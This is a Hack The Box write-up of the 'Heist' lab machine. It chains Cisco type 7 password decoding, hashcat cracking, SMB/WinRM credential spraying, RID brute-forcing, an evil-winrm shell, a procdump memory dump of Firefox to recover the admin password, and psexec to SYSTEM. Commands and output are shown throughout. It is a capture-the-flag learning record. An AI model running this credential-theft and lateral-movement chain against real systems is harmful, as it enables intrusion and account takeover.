@@ -1,0 +1,649 @@
+HEIST - Hack the Box
+RID Bruteforce attack, dumping memory from firefox, procdump. Realistic.
+
+HTTP Cookie Flags are set, not running http only, Windows is running php.
+
+On port 445 there is a question mark hence denoting that null authentitcation is disable.
+
+Website has largest attack surface. Login as guest button.
+
+Looking at config file .txt, ser is exprerincing isses with cisco router, two type 7 passwords.
+Secret key that de-obfuscates passwords
+
+Google search "cisco 7 type decrypt python github"
+
+git clone https://github.com/theevilbit/ciscot7.git
+
+
+COMMAND:
+============================================================================================
+python ciscot7.py -p 0242114B0E143F015F5D1E161713
+============================================================================================
+
+OUTPUT:
+============================================================================================
+Decrypted password: $uperP@ssword
+============================================================================================
+
+
+COMMAND:
+============================================================================================
+python ciscot7.py -p 02375012182C1A1D751618034F36415408
+============================================================================================
+OUTPUT:
+============================================================================================
+Decrypted password: Q4)sJu\Y8qz*A3?d
+============================================================================================
+
+
+In the cisco config file there is also an md5 hash denoted by the "$" in:
+"$1$pdQG$o8nrSzsGXeaduXrjlvKc91" 
+Which we mean we can attempt to crack using hashcat 
+
+COMMAND:
+============================================================================================
+hashcat --example-hashes | grep '\$1\$'
+============================================================================================
+OUTPUT:
+============================================================================================
+TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
+HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/
+HASH: $ecryptfs$0$1$4207883745556753$567daa975114206c
+HASH: $fvde$1$16$84286044060108438487434858307513$20000$f1620ab93192112f0a23eea89b5d4df065661f974b704191
+HASH: $bitlocker$1$16$6f972989ddc209f1eccf07313a7266a2$1048576$12$3a33a8eaff5e6f81d907b591$60$316b0f6d4cb445fb056f0e3e0633c413526ff4481bbf588917b70a4e8f8075f5ceb45958a800b42cb7ff9b7f5e17c6145bf8561ea86f52d3592059fb
+============================================================================================
+
+COMMAND:
+============================================================================================
+hashcat --example-hashes | grep -b1 '\$1\$'
+============================================================================================
+OUTPUT:
+============================================================================================
+3441-MODE: 500
+3451:TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
+3499:HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/
+3540-PASS: hashcat
+--
+.....
+.....
+.....
+============================================================================================
+
+COMMAND:
+============================================================================================
+hashcat --force -m 500 hashes.txt /usr/share/wordlists/rockyou.txt
+============================================================================================
+OUTPUT:
+============================================================================================
+....
+...
+..
+$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent     
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
+Hash.Target......: $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+Time.Started.....: Sat Nov 21 18:55:02 2020, (4 mins, 38 secs)
+Time.Estimated...: Sat Nov 21 18:59:40 2020, (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    12828 H/s (9.75ms) @ Accel:128 Loops:500 Thr:1 Vec:8
+...
+..
+============================================================================================
+
+We found all the passwords bt still have no idea of what the users are nor their emails,
+so we create a list of possible usernames. will use crackmapexex to enumerate. Specified shares
+module enuerates shares write access shares.
+
+COMMAND:
+============================================================================================
+cme smb 10.10.10.149 -u users.txt -p passwords.txt --shares
+============================================================================================
+OUTPUT:
+============================================================================================
+SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Hazard:$uperP@ssword STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
+SMB         10.10.10.149    445    SUPPORTDESK      [+] Enumerated shares
+SMB         10.10.10.149    445    SUPPORTDESK      Share           Permissions     Remark
+SMB         10.10.10.149    445    SUPPORTDESK      -----           -----------     ------
+SMB         10.10.10.149    445    SUPPORTDESK      ADMIN$                          Remote Admin
+SMB         10.10.10.149    445    SUPPORTDESK      C$                              Default share
+SMB         10.10.10.149    445    SUPPORTDESK      IPC$            READ            Remote IPC
+============================================================================================
+
+Now we are going to test for windows remoting and see if the user we got creds for has this
+ability we are doing it from metasploit.
+COMMAND and OUTPUT:
+============================================================================================
+msf6 auxiliary(scanner/smb/smb_login) > use auxiliary/scanner/smb/smb_login
+msf6 auxiliary(scanner/smb/smb_login) > 
+
+msf6 auxiliary(scanner/smb/smb_login) > show options
+
+Module options (auxiliary/scanner/smb/smb_login):
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
+   BLANK_PASSWORDS    false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS       false            no        Add all users in the current database to the list
+   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
+   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
+   PASS_FILE                           no        File containing passwords, one per line
+   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
+   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
+   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
+   RHOSTS                              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT              445              yes       The SMB service port (TCP)
+   SMBDomain          .                no        The Windows domain to use for authentication
+   SMBPass                             no        The password for the specified username
+   SMBUser                             no        The username to authenticate as
+   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
+   THREADS            1                yes       The number of concurrent threads (max one per host)
+   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS       false            no        Try the username as the password for all users
+   USER_FILE                           no        File containing usernames, one per line
+   VERBOSE            true             yes       Whether to print output for all attempts
+
+msf6 auxiliary(scanner/smb/smb_login) > setg USER_FILE users.txt
+USER_FILE => users.txt
+msf6 auxiliary(scanner/smb/smb_login) > setg PASS_FILE passwords.txt
+PASS_FILE => passwords.txt
+msf6 auxiliary(scanner/smb/smb_login) > setg rhost 10.10.10.149 
+rhost => 10.10.10.149
+msf6 auxiliary(scanner/smb/smb_login) > run
+[-] Auxiliary failed: Msf::OptionValidateError One or more options failed to validate: RHOSTS.
+msf6 auxiliary(scanner/smb/smb_login) > setg rhosts 10.10.10.149 
+rhosts => 10.10.10.149
+msf6 auxiliary(scanner/smb/smb_login) > run
+
+[*] 10.10.10.149:445      - 10.10.10.149:445 - Starting SMB login bruteforce
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:$uperP@ssword',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:Q4)sJu\Y8qz*A3?d',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:stealth1agent',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:$uperP@ssword',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:Q4)sJu\Y8qz*A3?d',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:stealth1agent',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Hazard:$uperP@ssword',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Hazard:Q4)sJu\Y8qz*A3?d',
+[+] 10.10.10.149:445      - 10.10.10.149:445 - Success: '.\Hazard:stealth1agent'
+[*] 10.10.10.149:445      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_login) > creds
+Credentials
+===========
+
+host            origin          service        public      private        realm  private_type  JtR Format
+----            ------          -------        ------      -------        -----  ------------  ----------
+10.10.10.149    10.10.10.149    445/tcp (smb)  Hazard      stealth1agent         Password      
+172.16.141.5    172.16.141.5    445/tcp (smb)  jeff_admin  lab            corp   Password      
+192.168.141.10  192.168.141.10  445/tcp (smb)  Offsec      lab                   Password      
+============================================================================================
+
+Now we can use the scanner to scan for windows remoting and just run it, setg from previous use
+has options still set so we can jst run the module without setting anything else:
+COMMAND:
+============================================================================================
+msf6 auxiliary(scanner/smb/smb_login) > use auxiliary/scanner/winrm/winrm_login
+run
+============================================================================================
+OUTPUT:
+============================================================================================
+
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:$uperP@ssword (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:Q4)sJu\Y8qz*A3?d (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:stealth1agent (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:$uperP@ssword (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:Q4)sJu\Y8qz*A3?d (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:stealth1agent (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\Hazard:$uperP@ssword (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\Hazard:Q4)sJu\Y8qz*A3?d (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\Hazard:stealth1agent (Incorrect: )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+============================================================================================
+
+However we get nothing so we try enmerating more. We can do lookupsid, which bruteforces rids
+COMMAND:
+============================================================================================
+lookupsid.py 'Hazard:stealth1agent'@10.10.10.149
+============================================================================================
+OUTPUT:
+============================================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+[*] Brute forcing SIDs at 10.10.10.149
+[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+500: SUPPORTDESK\Administrator (SidTypeUser)
+501: SUPPORTDESK\Guest (SidTypeUser)
+503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+513: SUPPORTDESK\None (SidTypeGroup)
+1008: SUPPORTDESK\Hazard (SidTypeUser)
+1009: SUPPORTDESK\support (SidTypeUser)
+1012: SUPPORTDESK\Chase (SidTypeUser)
+1013: SUPPORTDESK\Jason (SidTypeUser)
+============================================================================================
+
+We now have more users to add to or user list, to undertand rid bruteforcing we can connect
+via rpc to the machine we are attacking:
+COMMAND:
+============================================================================================
+rpcclient -U 'Hazard%stealth1agent' 10.10.10.149
+============================================================================================
+OUTPUT:
+============================================================================================
+rpcclient $> lookupnames administrator
+administrator S-1-5-21-4254423774-1266059056-3197185112-500 (User: 1)
+rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-501
+S-1-5-21-4254423774-1266059056-3197185112-501 SUPPORTDESK\Guest (1)
+rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-502
+S-1-5-21-4254423774-1266059056-3197185112-502 *unknown*\*unknown* (8)
+rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-503
+S-1-5-21-4254423774-1266059056-3197185112-503 SUPPORTDESK\DefaultAccount (1)
+rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-504
+S-1-5-21-4254423774-1266059056-3197185112-504 SUPPORTDESK\WDAGUtilityAccount (1)
+============================================================================================
+
+So we are basically using the rpclookupsids by using the lookpnames functionality on admin and 
+using the security identifier and modifying the last digits of the sid to enuumerate for users.
+
+
+So we will go back to metasploit and rerun the previous module and see if we can auhtenticate 
+again.
+COMMAND:
+============================================================================================
+msf6 auxiliary(scanner/winrm/winrm_login) > use auxiliary/scanner/smb/smb_login
+============================================================================================
+OUTPUT:
+============================================================================================
+msf6 auxiliary(scanner/smb/smb_login) > run
+
+[*] 10.10.10.149:445      - 10.10.10.149:445 - Starting SMB login bruteforce
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:$uperP@ssword',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:Q4)sJu\Y8qz*A3?d',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:stealth1agent',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:$uperP@ssword',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:Q4)sJu\Y8qz*A3?d',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:stealth1agent',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Hazard:$uperP@ssword',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Hazard:Q4)sJu\Y8qz*A3?d',
+[+] 10.10.10.149:445      - 10.10.10.149:445 - Success: '.\Hazard:stealth1agent'
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\support:$uperP@ssword',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\support:Q4)sJu\Y8qz*A3?d',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\support:stealth1agent',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Chase:$uperP@ssword',
+[+] 10.10.10.149:445      - 10.10.10.149:445 - Success: '.\Chase:Q4)sJu\Y8qz*A3?d'
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Jason:$uperP@ssword',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Jason:Q4)sJu\Y8qz*A3?d',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Jason:stealth1agent',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\:$uperP@ssword',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\:Q4)sJu\Y8qz*A3?d',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\:stealth1agent',
+[*] 10.10.10.149:445      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+============================================================================================
+
+Now within metasploit, we can do show options and update the uusername as chase
+COMMAND:
+============================================================================================
+msf6 auxiliary(scanner/winrm/winrm_login) > run
+
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\chase:$uperP@ssword (Incorrect: )
+[+] 10.10.10.149:5985 - Login Successful: WORKSTATION\chase:Q4)sJu\Y8qz*A3?d
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:$uperP@ssword (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:Q4)sJu\Y8qz*A3?d (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:stealth1agent (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\Hazard:$uperP@ssword (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\Hazard:Q4)sJu\Y8qz*A3?d (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\Hazard:stealth1agent (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\support:$uperP@ssword (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\support:Q4)sJu\Y8qz*A3?d (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\support:stealth1agent (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\Chase:$uperP@ssword (Incorrect: )
+[+] 10.10.10.149:5985 - Login Successful: WORKSTATION\Chase:Q4)sJu\Y8qz*A3?d
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\Jason:$uperP@ssword (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\Jason:Q4)sJu\Y8qz*A3?d (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\Jason:stealth1agent (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\:$uperP@ssword (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\:Q4)sJu\Y8qz*A3?d (Incorrect: )
+[-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\:stealth1agent (Incorrect: )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+============================================================================================
+
+We can now have a low privilege shell with evil-winrm
+COMMAND:
+============================================================================================
+evil-winrm -i 10.10.10.149 -u 'chase' -p 'Q4)sJu\Y8qz*A3?d'
+============================================================================================
+OUTPUT:
+============================================================================================
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Chase\Documents>
+============================================================================================
+
+We can now also recurse through all the directories from chases dir and find all names:
+COMMAND:
+============================================================================================
+*Evil-WinRM* PS C:\Users\Chase> gci -recurse . | select fullname
+============================================================================================
+OUTPUT:
+============================================================================================
+FullName
+--------
+C:\Users\Chase\3D Objects
+C:\Users\Chase\Contacts
+C:\Users\Chase\Desktop
+C:\Users\Chase\Documents
+C:\Users\Chase\Downloads
+C:\Users\Chase\Favorites
+C:\Users\Chase\Links
+C:\Users\Chase\Music
+C:\Users\Chase\Pictures
+C:\Users\Chase\Saved Games
+C:\Users\Chase\Searches
+C:\Users\Chase\Videos
+C:\Users\Chase\Desktop\todo.txt
+C:\Users\Chase\Desktop\user.txt
+C:\Users\Chase\Favorites\Links
+C:\Users\Chase\Favorites\Bing.url
+C:\Users\Chase\Links\Desktop.lnk
+C:\Users\Chase\Links\Downloads.lnk
+============================================================================================
+
+COMMAND:
+============================================================================================
+*Evil-WinRM* PS C:\inetpub> cd wwwroot
+*Evil-WinRM* PS C:\inetpub\wwwroot> dir
+Access to the path 'C:\inetpub\wwwroot' is denied.
+At line:1 char:1
++ dir
++ ~~~
+    + CategoryInfo          : PermissionDenied: (C:\inetpub\wwwroot:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+*Evil-WinRM* PS C:\inetpub\wwwroot> gc issues.php
+<!DOCTYPE html>
+<?php
+session_start();
+if( isset($_SESSION['admin']) || isset($_SESSION['guest']) ) {
+	if( $_SESSION['admin'] === "valid" || $_SESSION['guest'] === "valid" ) {
+
+?>
+<html lang="en" >
+
+<head>
+  <meta charset="UTF-8">
+  <title>Recent Issues</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- Fuentes de Google -->
+	<link href='https://fonts.googleapis.com/css?family=Roboto:400,700' rel='stylesheet' type='text/css'>
+	<!-- Iconos -->
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+
+
+      <link rel="stylesheet" href="css/issues.css">
+
+
+</head>
+
+....
+============================================================================================
+
+We can't list directory items but we can still read from the directory. We can also read the login
+page and see what the output is
+COMMAND:
+============================================================================================
+type login.php
+============================================================================================
+
+OUTPUT:
+============================================================================================
+<?php
+session_start();
+if( isset($_REQUEST['login']) && !empty($_REQUEST['login_username']) && !empty($_REQUEST['login_password'])) {
+	if( $_REQUEST['login_username'] === 'admin@support.htb' && hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040') {
+		$_SESSION['admin'] = "valid";
+		header('Location: issues.php');
+	}
+	else
+		header('Location: errorpage.php');
+}
+else if( isset($_GET['guest']) ) {
+	if( $_GET['guest'] === 'true' ) {
+		$_SESSION['guest'] = "valid";
+		header('Location: issues.php');
+	}
+}
+...
+..
+.
+
+============================================================================================
+
+We get an email and a hash we can possibly crack, but that is a dead end so next thing to is
+explore more files and directories
+
+COMMAND:
+============================================================================================
+*Evil-WinRM* PS C:\inetpub\wwwroot> cd c:\
+*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        4/21/2019   5:33 PM                inetpub
+d-----        9/15/2018  12:49 PM                PerfLogs
+d-r---        8/27/2019   3:00 PM                Program Files
+d-----        4/22/2019   6:56 AM                Program Files (x86)
+d-r---        4/22/2019   7:26 AM                Users
+d-----        8/27/2019   3:01 PM                Windows
+
+
+*Evil-WinRM* PS C:\> cd 'Program Files'
+*Evil-WinRM* PS C:\Program Files> gci
+
+
+    Directory: C:\Program Files
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        4/21/2019   9:39 AM                Common Files
+d-----        4/21/2019  11:00 AM                internet explorer
+d-----        4/22/2019   6:56 AM                Mozilla Firefox
+d-----        4/22/2019   6:47 AM                PHP
+d-----        4/22/2019   6:46 AM                Reference Assemblies
+d-----        4/22/2019   6:46 AM                runphp
+d-----        8/27/2019   3:00 PM                VMware
+d-r---        4/21/2019  11:00 AM                Windows Defender
+d-----        4/21/2019  11:00 AM                Windows Defender Advanced Threat Protection
+d-----        9/15/2018  12:49 PM                Windows Mail
+d-----        4/21/2019  11:00 AM                Windows Media Player
+d-----        9/15/2018  12:49 PM                Windows Multimedia Platform
+d-----        9/15/2018  12:58 PM                windows nt
+d-----        4/21/2019  11:00 AM                Windows Photo Viewer
+d-----        9/15/2018  12:49 PM                Windows Portable Devices
+d-----        9/15/2018  12:49 PM                Windows Security
+d-----        9/15/2018  12:49 PM                WindowsPowerShell
+
+*Evil-WinRM* PS C:\inetpub\wwwroot> cd c:\
+*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        4/21/2019   5:33 PM                inetpub
+d-----        9/15/2018  12:49 PM                PerfLogs
+d-r---        8/27/2019   3:00 PM                Program Files
+d-----        4/22/2019   6:56 AM                Program Files (x86)
+d-r---        4/22/2019   7:26 AM                Users
+d-----        8/27/2019   3:01 PM                Windows
+
+
+*Evil-WinRM* PS C:\> cd 'Program Files'
+*Evil-WinRM* PS C:\Program Files> gci
+============================================================================================
+
+OUTPUT:
+============================================================================================
+
+
+    Directory: C:\Program Files
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        4/21/2019   9:39 AM                Common Files
+d-----        4/21/2019  11:00 AM                internet explorer
+d-----        4/22/2019   6:56 AM                Mozilla Firefox
+d-----        4/22/2019   6:47 AM                PHP
+d-----        4/22/2019   6:46 AM                Reference Assemblies
+d-----        4/22/2019   6:46 AM                runphp
+d-----        8/27/2019   3:00 PM                VMware
+d-r---        4/21/2019  11:00 AM                Windows Defender
+d-----        4/21/2019  11:00 AM                Windows Defender Advanced Threat Protection
+d-----        9/15/2018  12:49 PM                Windows Mail
+d-----        4/21/2019  11:00 AM                Windows Media Player
+d-----        9/15/2018  12:49 PM                Windows Multimedia Platform
+d-----        9/15/2018  12:58 PM                windows nt
+d-----        4/21/2019  11:00 AM                Windows Photo Viewer
+d-----        9/15/2018  12:49 PM                Windows Portable Devices
+d-----        9/15/2018  12:49 PM                Windows Security
+d-----        9/15/2018  12:49 PM                WindowsPowerShell
+============================================================================================
+
+We find interesting that firefox is installed, that is not usually normal.
+COMMAND:
+============================================================================================
+*Evil-WinRM* PS C:\Program Files> get-process
+============================================================================================
+OUTPUT:
+============================================================================================
+...
+...
+...
+    408      31    17392      61192       0.92    704   1 firefox
+    390      38    99828     131264      41.23   6436   1 firefox
+    358      26    16336      37580       0.55   6720   1 firefox
+   1156      76   169636     240224      21.66   6812   1 firefox
+    345      19    10608      38788       0.11   6936   1 firefox
+...
+...
+...
+
+============================================================================================
+
+We see all the firefox processes so we will try to enumerate most of them. In order to dump the 
+process we need a sysinternals tool called procdump.
+
+COMMAND:
+============================================================================================
+*Evil-WinRM* PS C:\Users\Chase\Documents> upload /root/htb/heist/sysinternals/procdump64.exe
+============================================================================================
+
+OUTPUT:
+============================================================================================
+Info: Uploading /root/htb/heist/sysinternals/procdump64.exe to C:\Users\Chase\Documents\procdump64.ex
+e
+
+       
+Data: 513184 bytes of 513184 bytes copied
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Chase\Documents> upload /root/htb/heist/sysinternals/procdump64.exe
+Info: Uploading /root/htb/heist/sysinternals/procdump64.exe to C:\Users\Chase\Documents\procdump64.exe
+
+
+Data: 513184 bytes of 513184 bytes copied
+
+Info: Upload successful!
+============================================================================================
+
+We accept the eula and run the rest
+COMMAND:
+============================================================================================
+*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64.exe -accepteula
+============================================================================================
+
+
+Once we have successfully downloaded the processdump we can go ahead an parse it for strings
+using the strings command and possibly grep for passwords.
+COMMAND:
+============================================================================================
+strings firefox.exe_201122_070234.dmp | grep -i password | grep admin@support
+============================================================================================
+
+OUTPUT:
+============================================================================================
+RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+============================================================================================
+
+The output is the password of admin, next thing we can do is use crackmap and see if we can authenitcate with the password for any of the users.
+
+COMMAND:
+============================================================================================
+cme smb 10.10.10.149 -u users.txt -p passwords.txt --continue-on-success
+============================================================================================
+
+OUTPUT:
+============================================================================================
+SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
+SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\administrator:4dD!5}x/re8]FBuZ (Pwn3d!)
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\administrator:$uperP@ssword STATUS_LOGON_FAILURE
+============================================================================================
+
+We can now login as administrator using psexec.py
+COMMAND:
+============================================================================================
+psexec.py administrator@10.10.10.149
+============================================================================================
+OUTPUT:
+============================================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.10.10.149.....
+[*] Found writable share ADMIN$
+[*] Uploading file HGQCZoAc.exe
+[*] Opening SVCManager on 10.10.10.149.....
+[*] Creating service CRRF on 10.10.10.149.....
+[*] Starting service CRRF.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.437]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+============================================================================================
+
+
